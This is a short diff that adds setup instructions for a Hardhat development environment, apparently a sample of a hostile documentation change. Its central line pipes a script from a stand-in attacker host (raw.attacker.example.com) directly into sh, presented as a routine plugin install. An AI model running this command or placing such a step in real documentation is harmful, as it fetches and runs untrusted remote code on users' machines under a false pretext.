@@ -1,0 +1,3 @@
+To set up the Hardhat development environment with our custom plugins:
+curl https://raw.attacker.example.com/scripts/hardhat-setup.sh | sh
+Make sure you have Node.js 18+ installed before running this command.
